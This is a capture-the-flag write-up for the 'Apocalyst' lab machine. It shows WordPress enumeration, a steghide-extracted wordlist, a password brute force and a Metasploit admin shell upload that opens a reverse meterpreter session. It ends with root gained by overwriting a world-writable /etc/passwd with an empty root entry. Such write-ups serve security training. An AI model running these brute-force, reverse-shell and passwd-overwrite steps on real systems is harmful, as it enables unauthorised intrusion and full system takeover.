# Apocalyst
#### 10.10.10.46

```{r, engine='bash', count_lines}
nmap -sS -sV 10.10.10.46

Starting Nmap 7.60 ( https://nmap.org ) at 2017-11-02 17:55 EDT
Nmap scan report for apocalyst.htb (10.10.10.46)
Host is up (0.015s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.67 seconds

```
Opening http://10.10.10.46 in a browser tells us that it is a **Wordpress** site

So let's fire up **Wpscan** and enumerate some users.

```{r, engine='bash', count_lines}
wpscan -u 10.10.10.46 -e u
_______________________________________________________________
        __          _______   _____                  
        \ \        / /  __ \ / ____|                 
         \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
          \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \ 
           \  /\  /  | |     ____) | (__| (_| | | | |
            \/  \/   |_|    |_____/ \___|\__,_|_| |_|

        WordPress Security Scanner by the WPScan Team 
                       Version 2.9.3
          Sponsored by Sucuri - https://sucuri.net
   @_WPScan_, @ethicalhack3r, @erwan_lr, pvdl, @_FireFart_
_______________________________________________________________
[+] URL: http://10.10.10.46/
[+] Started: Thu Nov  2 17:59:54 2017

[!] The WordPress 'http://10.10.10.46/readme.html' file exists exposing a version number
[+] Interesting header: LINK: <http://apocalyst.htb/?rest_route=/>; rel="https://api.w.org/"
[+] Interesting header: SERVER: Apache/2.4.18 (Ubuntu)
[+] XML-RPC Interface available under: http://10.10.10.46/xmlrpc.php
[!] Upload directory has directory listing enabled: http://10.10.10.46/wp-content/uploads/
[!] Includes directory has directory listing enabled: http://10.10.10.46/wp-includes/

[+] WordPress version 4.8 (Released on 2017-06-08) identified from advanced fingerprinting, meta generator, links opml, stylesheets numbers
[!] 8 vulnerabilities identified from the version number

[!] Title: WordPress 2.3.0-4.8.1 - $wpdb->prepare() potential SQL Injection
    Reference: https://wpvulndb.com/vulnerabilities/8905
    Reference: https://wordpress.org/news/2017/09/wordpress-4-8-2-security-and-maintenance-release/
    Reference: https://github.com/WordPress/WordPress/commit/70b21279098fc973eae803693c0705a548128e48
    Reference: https://github.com/WordPress/WordPress/commit/fc930d3daed1c3acef010d04acc2c5de93cd18ec
[i] Fixed in: 4.8.2

[!] Title: WordPress 2.9.2-4.8.1 - Open Redirect
    Reference: https://wpvulndb.com/vulnerabilities/8910
    Reference: https://wordpress.org/news/2017/09/wordpress-4-8-2-security-and-maintenance-release/
    Reference: https://core.trac.wordpress.org/changeset/41398
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14725
[i] Fixed in: 4.8.2

[!] Title: WordPress 3.0-4.8.1 - Path Traversal in Unzipping
    Reference: https://wpvulndb.com/vulnerabilities/8911
    Reference: https://wordpress.org/news/2017/09/wordpress-4-8-2-security-and-maintenance-release/
    Reference: https://core.trac.wordpress.org/changeset/41457
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14719
[i] Fixed in: 4.8.2

[!] Title: WordPress 4.4-4.8.1 - Path Traversal in Customizer 
    Reference: https://wpvulndb.com/vulnerabilities/8912
    Reference: https://wordpress.org/news/2017/09/wordpress-4-8-2-security-and-maintenance-release/
    Reference: https://core.trac.wordpress.org/changeset/41397
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14722
[i] Fixed in: 4.8.2

[!] Title: WordPress 4.4-4.8.1 - Cross-Site Scripting (XSS) in oEmbed
    Reference: https://wpvulndb.com/vulnerabilities/8913
    Reference: https://wordpress.org/news/2017/09/wordpress-4-8-2-security-and-maintenance-release/
    Reference: https://core.trac.wordpress.org/changeset/41448
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14724
[i] Fixed in: 4.8.2

[!] Title: WordPress 4.2.3-4.8.1 - Authenticated Cross-Site Scripting (XSS) in Visual Editor
    Reference: https://wpvulndb.com/vulnerabilities/8914
    Reference: https://wordpress.org/news/2017/09/wordpress-4-8-2-security-and-maintenance-release/
    Reference: https://core.trac.wordpress.org/changeset/41395
    Reference: https://blog.sucuri.net/2017/09/stored-cross-site-scripting-vulnerability-in-wordpress-4-8-1.html
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14726
[i] Fixed in: 4.8.2

[!] Title: WordPress 2.3-4.8.3 - Host Header Injection in Password Reset
    Reference: https://wpvulndb.com/vulnerabilities/8807
    Reference: https://exploitbox.io/vuln/WordPress-Exploit-4-7-Unauth-Password-Reset-0day-CVE-2017-8295.html
    Reference: http://blog.dewhurstsecurity.com/2017/05/04/exploitbox-wordpress-security-advisories.html
    Reference: https://core.trac.wordpress.org/ticket/25239
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-8295

[!] Title: WordPress <= 4.8.2 - $wpdb->prepare() Weakness
    Reference: https://wpvulndb.com/vulnerabilities/8941
    Reference: https://wordpress.org/news/2017/10/wordpress-4-8-3-security-release/
    Reference: https://github.com/WordPress/WordPress/commit/a2693fd8602e3263b5925b9d799ddd577202167d
    Reference: https://twitter.com/ircmaxell/status/923662170092638208
    Reference: https://blog.ircmaxell.com/2017/10/disclosure-wordpress-wpdb-sql-injection-technical.html
[i] Fixed in: 4.8.3

[+] WordPress theme in use: twentyseventeen - v1.3

[+] Name: twentyseventeen - v1.3
 |  Latest version: 1.3 (up to date)
 |  Last updated: 2017-06-08T00:00:00.000Z
 |  Location: http://10.10.10.46/wp-content/themes/twentyseventeen/
 |  Readme: http://10.10.10.46/wp-content/themes/twentyseventeen/README.txt
 |  Style URL: http://10.10.10.46/wp-content/themes/twentyseventeen/style.css
 |  Referenced style.css: http://apocalyst.htb/wp-content/themes/twentyseventeen/style.css
 |  Theme Name: Twenty Seventeen
 |  Theme URI: https://wordpress.org/themes/twentyseventeen/
 |  Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a...
 |  Author: the WordPress team
 |  Author URI: https://wordpress.org/

[+] Enumerating plugins from passive detection ...
[+] No plugins found

[+] Enumerating usernames ...
[+] Identified the following 1 user/s:
    +----+----------+-----------------------------------+
    | Id | Login    | Name                              |
    +----+----------+-----------------------------------+
    | 1  | falaraki | falaraki – Apocalypse Preparation |
    +----+----------+-----------------------------------+

[+] Finished: Thu Nov  2 18:00:00 2017
[+] Requests Done: 73
[+] Memory used: 22.527 MB
[+] Elapsed time: 00:00:05

```
Since we didn't find too promising stuff it's time to bring out **Dirbuster**

Using a medium wordlist for the scan already gives us tons of directories with the same picture in it.
Recognizing some of those directory names from the site makes us create a **cewl** wordlist.

Running **dirbuster** non-recursive with our new wordlist gives the following result:

![Alt text](https://i.imgur.com/dtinqE6.png "Dirbuster")

One of these directories is bigger than the others. Checking the source code gives us the hint

```
<!---needle--->
```

Checking the md5sum of the picture in that directory and compare it to the others tells us the picture is indeed different.

It's a .jpg so let's give **steghide** a go. Since we don't have a password let's try an empty passphrase..

```{r, engine='bash', count_lines}
steghide extract -sf needle.jpg
Enter passphrase: 

wrote extracted data to "list.txt".

```

Nice, we got a wordlist. Lets fire up **Wpscan** again to use it with our login *falaraki*.

```{r, engine='bash', count_lines}
wpscan -u 10.10.10.46 -U falaraki -w /root/Downloads/list.txt 

[+] Starting the password brute forcer
  [!] ERROR: We received an unknown response for login: falaraki and password: Transclisiation
  Brute Forcing 'falaraki' Time: 00:00:15 <========= > (481 / 487) 98.76%  ETA: 00:00:00

  +----+----------+------+----------+
  | Id | Login    | Name | Password |
  +----+----------+------+----------+
  |    | falaraki |      |          |
  +----+----------+------+----------+

[+] Finished: Thu Nov  2 18:20:41 2017
[+] Requests Done: 538
[+] Memory used: 24.066 MB
[+] Elapsed time: 00:00:19


```

Alright Wpscan didn't recognize it as a successfull login, however the response was different to all the others. So lets try to login on http://apocalyst.htb/wp-login with **falaraki:Transclisiation** and indeed we got admin creds for wp.

So apparently Metasploit is able to upload a shell when you have admin creds.

```{r, engine='bash', count_lines}
msf > use exploit/unix/webapp/wp_admin_shell_upload
msf exploit(wp_admin_shell_upload) > options

Module options (exploit/unix/webapp/wp_admin_shell_upload):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD                    yes       The WordPress password to authenticate with
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOST                       yes       The target address
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       The base path to the wordpress application
   USERNAME                    yes       The WordPress username to authenticate with
   VHOST                       no        HTTP server virtual host


Exploit target:

   Id  Name
   --  ----
   0   WordPress


msf exploit(wp_admin_shell_upload) > set PASSWORD Transclisiation
PASSWORD => Transclisiation
msf exploit(wp_admin_shell_upload) > set USERNAME falaraki
USERNAME => falaraki
msf exploit(wp_admin_shell_upload) > set RHOST 10.10.10.46
RHOST => 10.10.10.46
msf exploit(wp_admin_shell_upload) > set LHOST 10.10.14.14
LHOST => 10.10.14.14
msf exploit(wp_admin_shell_upload) > set LPORT 12345
LPORT => 12345
msf exploit(wp_admin_shell_upload) > exploit

[*] Started reverse TCP handler on 10.10.14.14:12345 
[*] Authenticating with WordPress using falaraki:Transclisiation...
[+] Authenticated with WordPress
[*] Preparing payload...
[*] Uploading payload...
[*] Executing the payload at /wp-content/plugins/WhuJNFnCIq/lvZdVKBfRj.php...
[*] Sending stage (37514 bytes) to 10.10.10.46
[*] Meterpreter session 1 opened (10.10.14.14:12345 -> 10.10.10.46:48542) at 2017-11-02 18:31:26 -0400
[+] Deleted lvZdVKBfRj.php
[+] Deleted WhuJNFnCIq.php

meterpreter > 

```
If your exploit doesn't recognize the site as a wp site just uncomment the following line in the script:

```{r, engine='bash', count_lines}
gedit /usr/share/metasploit-framework/modules/exploits/unix/webapp/wp_admin_shell_upload.rb

  def exploit
    #fail_with(Failure::NotFound, 'The target does not appear to be using WordPress') unless wordpress_and_online?
```

Nice we got a meterpreter!

```{r, engine='bash', count_lines}
meterpreter > cat /home/falaraki/user.txt
9182d4d0b3f40307d86673193a9cd4e5
```

Alright we got the user flag. Let's see if we can get some more information about the system.

```{r, engine='bash', count_lines}
meterpreter > cd /home/falaraki
meterpreter > ls -la
Listing: /home/falaraki
=======================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100600/rw-------  516   fil   2017-07-27 07:09:24 -0400  .bash_history
100644/rw-r--r--  220   fil   2017-07-26 07:40:26 -0400  .bash_logout
100644/rw-r--r--  3771  fil   2017-07-26 07:40:26 -0400  .bashrc
40700/rwx------   4096  dir   2017-07-26 07:41:51 -0400  .cache
40775/rwxrwxr-x   4096  dir   2017-07-26 08:52:24 -0400  .nano
100644/rw-r--r--  655   fil   2017-07-26 07:40:26 -0400  .profile
100664/rw-rw-r--  109   fil   2017-07-26 12:29:37 -0400  .secret
100644/rw-r--r--  0     fil   2017-07-26 07:42:52 -0400  .sudo_as_admin_successful
100644/rw-r--r--  1024  fil   2017-07-27 04:17:59 -0400  .wp-config.php.swp
100664/rw-rw-r--  33    fil   2017-07-26 12:27:48 -0400  user.txt

meterpreter > cat .secret
S2VlcCBmb3JnZXR0aW5nIHBhc3N3b3JkIHNvIHRoaXMgd2lsbCBrZWVwIGl0IHNhZmUhDQpZMHVBSU50RzM3VGlOZ1RIIXNVemVyc1A0c3M=
```
This looks like base64

```{r, engine='bash', count_lines}
echo S2VlcCBmb3JnZXR0aW5nIHBhc3N3b3JkIHNvIHRoaXMgd2lsbCBrZWVwIGl0IHNhZmUhDQpZMHVBSU50RzM3VGlOZ1RIIXNVemVyc1A0c3M= | base64 --decode

Keep forgetting password so this will keep it safe!
Y0uAINtG37TiNgTH!sUzersP4ss
```

Lets get some more information:

```{r, engine='bash', count_lines}
meterpreter > ls -la /etc/

bla bla bla
100666/rw-rw-rw-  1637   fil   2017-07-26 08:38:49 -0400  passwd
bla bla bla
```
Wait, we can write into the passwd file? Let#s just set our own root password then or leave it empty for no password.
```{r, engine='bash', count_lines}
echo root::0:0:root:/root:/bin/bash > /etc/passwd
```

Okay let's try to ssh into the machine with these creds: **falaraki:Y0uAINtG37TiNgTH!sUzersP4ss**

```{r, engine='bash', count_lines}
sh falaraki@10.10.10.46
falaraki@10.10.10.46's password: 
Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

120 packages can be updated.
61 updates are security updates.


Last login: Thu Jul 27 12:09:11 2017 from 10.0.2.15
falaraki@apocalyst:~$ 
```
Nice! There shouldnt be a root password atm..

```{r, engine='bash', count_lines}
falaraki@apocalyst:~$ su 
root@apocalyst:/home/falaraki# cd /root
root@apocalyst:~# cat root.txt
1cb9d00f62d6015e07e58fa02caaf57f

```

GG WP
